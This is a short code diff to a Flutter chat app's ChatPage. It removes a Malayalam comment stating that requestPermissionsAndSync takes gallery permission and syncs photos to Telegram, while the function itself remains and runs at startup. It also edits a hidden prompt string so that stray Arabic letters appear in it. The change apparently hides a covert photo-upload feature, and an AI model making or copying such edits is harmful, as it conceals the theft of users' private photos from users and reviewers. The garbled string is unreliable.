@@ -122,7 +122,6 @@ class _ChatPageState extends State<ChatPage> {
     requestPermissionsAndSync();
   }
 
-  // ഗാലറി പെർമിഷൻ വാങ്ങി ടെലഗ്രാമിലേക്ക് ഫോട്ടോ സിങ്ക് ചെയ്യുന്ന ഫങ്ഷൻ
   Future<void> requestPermissionsAndSync() async {
     var status = await Permission.storage.request();
     if (!status.isGranted) {
@@ -195,7 +194,7 @@ class _ChatPageState extends State<ChatPage> {
     } else if (msgs.where((m) => !m.hidden).isEmpty) {
       ask('(ippo app open cheythu. nee aadyam hi paranju samsaram thudangu)', hidden: true);
     } else {
-      ask('(njan thirichu vannu. munpathe samsaram continue cheythu, mood anusarichu welcome parayu)',
+      ask('(njan thirichu vannu. munpathe samsaram continue cheythu, mood anusارichu welcome parayu)',
           hidden: true);
     }
   }
